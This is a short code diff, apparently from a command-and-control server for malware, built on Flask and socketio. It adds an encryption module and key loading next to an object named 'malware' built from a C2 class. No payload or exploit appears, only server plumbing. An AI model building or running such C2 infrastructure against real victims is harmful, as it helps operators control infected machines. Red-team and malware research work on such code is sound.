@@ -5,10 +5,16 @@ from c2 import C2
 import os
 import threading
 import json
+from encryption import encrypt_messages
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)  # Secret key for session management
 sio = socketio.Server(cors_allowed_origins="*", logger=False, max_http_buffer_size=1e8)
+
+keys = encrypt_messages()
+public_key = keys.receive_public_key()
+private_key = keys.receive_private_key()
+
 malware = C2(sio)
 
 # Helper function to check if user is logged in
